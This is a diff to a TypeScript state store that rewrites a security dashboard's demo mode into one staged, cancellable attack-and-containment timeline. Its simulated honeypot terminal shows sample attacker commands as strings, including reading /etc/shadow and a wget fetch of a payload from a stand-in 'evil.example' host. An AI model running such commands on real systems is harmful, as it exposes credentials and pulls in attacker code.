@@ -192,11 +192,12 @@ type Listener = () => void;
 class Store {
   private state: AppState = initialState;
   private listeners = new Set<Listener>();
-  private demoSimInterval: ReturnType<typeof setTimeout> | null = null;
-  // Demo Mode's honeypot capture cycle: one recurring "next capture" timer,
-  // plus the short-lived timers for the command stream within a capture.
-  private demoHoneypotTimer: ReturnType<typeof setTimeout> | null = null;
-  private demoHoneypotSubTimers: ReturnType<typeof setTimeout>[] = [];
+  // Monotonic run id guards the demo lifecycle: bumping it invalidates any
+  // in-flight arming/attack sequence (used by disableDemoMode and re-runs).
+  private demoRunId = 0;
+  // Short-lived timers for the captured-command stream inside a demo run,
+  // cleared together when demo mode is disabled.
+  private demoSubTimers: ReturnType<typeof setTimeout>[] = [];
   private eventIdCounter = 0;
 
   getState(): AppState {
@@ -272,6 +273,12 @@ class Store {
 
   setOverview(patch: Partial<OverviewMetrics>) {
     this.setState({ overview: { ...this.state.overview, ...patch } });
+  }
+
+  // Empties the captured-session UI (terminal + fingerprint) and puts the
+  // honeypot back on standby. Used after a kill switch / reset.
+  clearHoneypotSession() {
+    this.setState({ honeypot: { status: "waiting", commands: [], fingerprint: null } });
   }
 
   // ── Target management ──────────────────────────────────────────────────
@@ -385,7 +392,7 @@ class Store {
     });
   }
 
-  // ── Demo Target Mode ──────────────────────────────────────────────────
+  // ── Demo Target Mode ──────────────────────────────────────────────────────
   enableTargetDemo() {
     this.setTargetStatus({ status: "demo_connected", mode: "demo" });
     this.initializeDemoMode();
@@ -402,30 +409,15 @@ class Store {
     this.initializeDemoMode();
   }
 
-  // ── Demo Mode Initialization Sequence ───────────────────────────────────
-  async initializeDemoMode() {
-    // Step 1: Honeypot initialization
-    this.setHoneypotStatus("initializing");
-    
-    // Step 2: After delay, honeypot becomes armed
-    await new Promise(resolve => setTimeout(resolve, 300));
-    this.setHoneypotStatus("armed");
-    
-    // Step 3: After delay, honeypot becomes active (with glow)
-    await new Promise(resolve => setTimeout(resolve, 500));
-    this.setHoneypotStatus("active");
-    
-    // Step 4: After delay, start the actual demo simulation
-    await new Promise(resolve => setTimeout(resolve, 1500));
-    this.startDemoSimulation();
-  }
-
+  // Immediately cancels the demo and returns the dashboard to its calm,
+  // neutral starting state — no glow, no attack colors, no animations.
   disableDemoMode() {
+    this.cancelDemoLifecycle();
     if (this.state.target.status.status === "demo_connected") {
       this.setTargetStatus({ status: "disconnected", mode: "demo" });
     }
     (["red", "blue"] as const).forEach((team) => this.setAgentStatus(team, "not_connected"));
-    this.stopDemoSimulation();
+    this.resetSimulation();
   }
 
   toggleDemoMode() {
@@ -433,132 +425,178 @@ class Store {
     isOn ? this.disableDemoMode() : this.enableDemoMode();
   }
 
-  // Fires every 4-5s while demo mode is on, nudging threat counters so the
-  // dashboard looks alive on stage. Deliberately does NOT touch networkTraffic
-  // or appendTraffic — simulation.ts already drives a live 1s traffic stream,
-  // and writing to the same fields here would fight it and flicker on screen.
-  private startDemoSimulation() {
-    if (this.demoSimInterval) return; // already running
-    const tick = () => {
-      const o = this.state.overview;
-      const detected = o.threatsDetected + (Math.random() < 0.6 ? 1 : 0);
-      const contained = o.threatsContained + (Math.random() < 0.45 ? 1 : 0);
-      this.setOverview({
-        threatsDetected: detected,
-        threatsContained: Math.min(contained, detected),
-        activeThreats: Math.max(0, detected - contained),
-      });
-      this.demoSimInterval = setTimeout(tick, 4000 + Math.random() * 1000);
-    };
-    this.demoSimInterval = setTimeout(tick, 4000 + Math.random() * 1000);
-    this.startDemoHoneypotCycle();
-  }
+  // ── Demo lifecycle ────────────────────────────────────────────────────────
+  // One deterministic timeline drives the whole demo. Every visual — card
+  // colors, glow, honeypot panel, phase stepper — is derived from the state
+  // this writes, so the UI always agrees with the actual application state.
+  async initializeDemoMode() {
+    // Start from a clean slate so a re-run never stacks on old state.
+    this.resetSimulation();
+    const runId = ++this.demoRunId;
+    const wait = (ms: number) => new Promise((resolve) => setTimeout(resolve, ms));
+    const cancelled = () => this.demoRunId !== runId;
+    const stamp = () => new Date().toLocaleTimeString("en-GB", { hour12: false });
 
-  private stopDemoSimulation() {
-    if (this.demoSimInterval) {
-      clearTimeout(this.demoSimInterval);
-      this.demoSimInterval = null;
-    }
-    this.stopDemoHoneypotCycle();
-  }
+    // Phase 0 — Honeypot arms before anything else happens. Red/Blue stay neutral.
+    this.setHoneypotStatus("arming");
+    await wait(900);
+    if (cancelled()) return;
+    this.setHoneypotStatus("armed");
+    this.appendEvent({
+      type: "honeypot_waiting",
+      severity: "info",
+      timestamp: stamp(),
+      message: "Honeypot armed — deception layer ready before the attack begins",
+    });
 
-  // Demo Mode honeypot: repeatedly runs a full waiting → captured → command
-  // stream → waiting cycle so the Honeypot panel looks as alive as the rest
-  // of the dashboard instead of sitting static while everything else moves.
-  private startDemoHoneypotCycle() {
-    if (this.demoHoneypotTimer) return; // already running
-    const commandPool = [
+    // Short cinematic transition while the trap sits ARMED.
+    await wait(1900);
+    if (cancelled()) return;
+
+    // Phase 1 — Attack begins.
+    this.setSimulation({ phase: "attack", running: true, stopped: false });
+    this.setTopology({ attackActive: true, attackTarget: "blue_team" });
+    this.setHoneypotStatus("active");
+    this.setOverview({ activeThreats: 1 });
+    this.appendEvent({
+      type: "attack_started",
+      severity: "high",
+      source: "192.168.50.40",
+      target: "192.0.2.10:8080",
+      timestamp: stamp(),
+      message: "Attack started — Red Team engaging the protected target",
+    });
+
+    await wait(2400);
+    if (cancelled()) return;
+
+    // Phase 2 — Threat detected: Blue Team shifts to defending.
+    this.setSimulation({ phase: "detection" });
+    this.setOverview({ threatsDetected: this.state.overview.threatsDetected + 1 });
+    this.appendEvent({
+      type: "threat_detected",
+      severity: "high",
+      source: "192.168.50.40",
+      target: "192.0.2.10:8080",
+      timestamp: stamp(),
+      message: "Suspicious activity detected — Blue Team is responding",
+    });
+
+    await wait(2200);
+    if (cancelled()) return;
+
+    // Phase 3 — Honeypot deception engages the attacker.
+    this.setSimulation({ phase: "honeypot" });
+    this.appendEvent({
+      type: "honeypot_active",
+      severity: "info",
+      target: "192.168.50.30",
+      timestamp: stamp(),
+      message: "Honeypot deception environment engaging the attacker",
+    });
+
+    await wait(2200);
+    if (cancelled()) return;
+
+    // Phase 4 — Session captured; stream realistic decoy commands.
+    this.setSimulation({ phase: "capture" });
+    const sessionId = `SES-${Math.floor(1000 + Math.random() * 9000)}`;
+    const sourceIp = "203.0.113.23";
+    this.setHoneypotStatus("captured");
+    this.setFingerprint(
+      {
+        sourceIp,
+        sessionId,
+        detectionTime: stamp(),
+        attackType: "Credential brute-force",
+        severity: "HIGH",
+        sessionStatus: "Captured",
+        honeypotStatus: "Active",
+      },
+      "captured"
+    );
+    this.setOverview({ honeypotCaptures: this.state.overview.honeypotCaptures + 1 });
+    this.appendEvent({
+      type: "honeypot_session_captured",
+      severity: "critical",
+      source: sourceIp,
+      sessionId,
+      attackType: "Credential brute-force",
+      timestamp: stamp(),
+      message: "Attacker session captured by honeypot — redirecting into deception environment",
+    });
+
+    const capturedCommands = [
       "whoami",
       "id",
       "ls -la",
       "cat /etc/passwd",
       "uname -a",
       "ifconfig",
-      "history",
       "sudo cat /etc/shadow",
       "wget http://evil.example/payload.sh",
-      "chmod +x /tmp/payload.sh",
-      "./payload.sh -o /dev/null",
     ];
-    const nowStr = () => new Date().toLocaleTimeString("en-GB", { hour12: false });
-
-    const runCycle = () => {
-      const sessionId = `SES-${Math.floor(1000 + Math.random() * 9000)}`;
-      const sourceIp = `203.0.113.${Math.floor(1 + Math.random() * 254)}`;
-
-      this.setFingerprint(
-        {
-          sourceIp,
-          sessionId,
-          detectionTime: nowStr(),
-          attackType: "Credential brute-force",
-          severity: "HIGH",
-          sessionStatus: "Captured",
-          honeypotStatus: "Active",
-        },
-        "captured"
-      );
-      this.appendEvent({
-        type: "honeypot_session_captured",
-        severity: "critical",
-        source: sourceIp,
-        sessionId,
-        attackType: "Credential brute-force",
-        timestamp: nowStr(),
-        message: "Attacker session captured by honeypot — redirecting into deception environment",
-      });
-      this.setOverview({ honeypotCaptures: this.state.overview.honeypotCaptures + 1 });
-
-      // Stream a handful of fake attacker commands, spaced out like a real
-      // interactive session.
-      const shuffled = [...commandPool].sort(() => Math.random() - 0.5);
-      const cmds = shuffled.slice(0, 4 + Math.floor(Math.random() * 3));
-      cmds.forEach((cmd, i) => {
-        const t = setTimeout(() => {
-          this.appendHoneypotCommand(cmd);
-          this.appendEvent({
-            type: "honeypot_command",
-            severity: "info",
-            command: cmd,
-            sessionId,
-            timestamp: nowStr(),
-            message: "Attacker command captured",
-          });
-        }, (i + 1) * 1100);
-        this.demoHoneypotSubTimers.push(t);
-      });
-
-      // Re-arm the honeypot once the fake session winds down.
-      const rearmDelay = cmds.length * 1100 + 2200;
-      const rearmTimer = setTimeout(() => {
-        this.setHoneypotStatus("waiting");
+    const shuffledCommands = [...capturedCommands].sort(() => Math.random() - 0.5).slice(0, 5);
+    shuffledCommands.forEach((cmd, i) => {
+      const t = setTimeout(() => {
+        if (cancelled()) return;
+        this.appendHoneypotCommand(cmd);
         this.appendEvent({
-          type: "honeypot_waiting",
+          type: "honeypot_command",
           severity: "info",
-          timestamp: nowStr(),
-          message: "Honeypot re-armed and waiting",
+          command: cmd,
+          sessionId,
+          timestamp: stamp(),
+          message: "Attacker command captured",
         });
-      }, rearmDelay);
-      this.demoHoneypotSubTimers.push(rearmTimer);
+      }, (i + 1) * 900);
+      this.demoSubTimers.push(t);
+    });
 
-      // Schedule the next capture.
-      this.demoHoneypotTimer = setTimeout(runCycle, rearmDelay + 6000 + Math.random() * 5000);
-    };
+    await wait(3200);
+    if (cancelled()) return;
 
-    // First capture happens a few seconds after demo mode turns on, so it
-    // doesn't fire the exact instant the toggle is clicked.
-    this.demoHoneypotTimer = setTimeout(runCycle, 3000);
+    // Phase 5 — Containment: the attack is blocked, environment secured.
+    this.setSimulation({ phase: "containment" });
+    this.setTopology({ attackActive: false, attackTarget: null });
+    this.setOverview({
+      activeThreats: 0,
+      threatsContained: this.state.overview.threatsContained + 1,
+    });
+    this.setHoneypotStatus("waiting");
+    this.appendEvent({
+      type: "containment_in_progress",
+      severity: "warning",
+      source: "orchestrator",
+      timestamp: stamp(),
+      message: "Isolating the attacker and rolling back the session",
+    });
+
+    await wait(2600);
+    if (cancelled()) return;
+
+    // Phase 6 — Complete / final secured state.
+    this.setSimulation({ phase: "completed", running: false, stopped: false });
+    this.appendEvent({
+      type: "simulation_completed",
+      severity: "success",
+      timestamp: stamp(),
+      message: "Demo complete — attack blocked and environment secured",
+    });
   }
 
-  private stopDemoHoneypotCycle() {
-    if (this.demoHoneypotTimer) {
-      clearTimeout(this.demoHoneypotTimer);
-      this.demoHoneypotTimer = null;
-    }
-    this.demoHoneypotSubTimers.forEach((t) => clearTimeout(t));
-    this.demoHoneypotSubTimers = [];
-    // Leave the honeypot in a clean, re-armed state for next time.
-    this.setState({ honeypot: { status: "waiting", commands: [], fingerprint: null } });
+  // Invalidates any in-flight demo lifecycle and clears its sub-timers.
+  private cancelDemoLifecycle() {
+    this.demoRunId++;
+    this.demoSubTimers.forEach((t) => clearTimeout(t));
+    this.demoSubTimers = [];
+  }
+
+  // Stops demo-mode activity and returns the dashboard to the calm neutral
+  // state — no attack colors, no glow, honeypot back on standby.
+  private stopDemoSimulation() {
+    this.cancelDemoLifecycle();
+    this.resetSimulation();
   }
 
   openSettings(tab: AppState["settings"]["tab"] = "protected_target") {
